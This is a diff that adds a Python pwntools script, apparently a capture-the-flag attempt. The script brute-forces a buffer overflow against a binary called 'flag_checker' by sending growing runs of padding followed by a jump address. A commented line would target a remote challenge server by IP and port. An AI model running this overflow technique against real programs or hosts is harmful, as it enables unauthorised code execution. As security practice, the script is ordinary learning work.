@@ -1,3 +1,29 @@
-version https://git-lfs.github.com/spec/v1
-oid sha256:b57858138bcddabca49a5a0bf0c434eb76c8ee86943ef69e26b77d9a219b9d8d
-size 655
+from pwn import *
+
+# Set the host and port to connect to
+HOST = "178.128.106.114"
+PORT = 1337
+
+
+#create buffer
+for i in range(1,1000):
+    buffer = b'A'*i
+    e = ELF("./flag_checker")
+    hit = p32(0x00000000004040c0)
+
+    payload = buffer
+    payload += hit
+    
+    # Create a process to execute the nc command
+    # nc_process = process(["nc", HOST, str(PORT)])
+    nc_process = process("./flag_checker")
+
+    # Interact with the process to send and receive data
+    print(nc_process.recvline())
+    print(nc_process.recvline())
+    nc_process.sendline(payload)
+    print(nc_process.recvline())
+    
+    # Close the connection
+    nc_process.close()
+
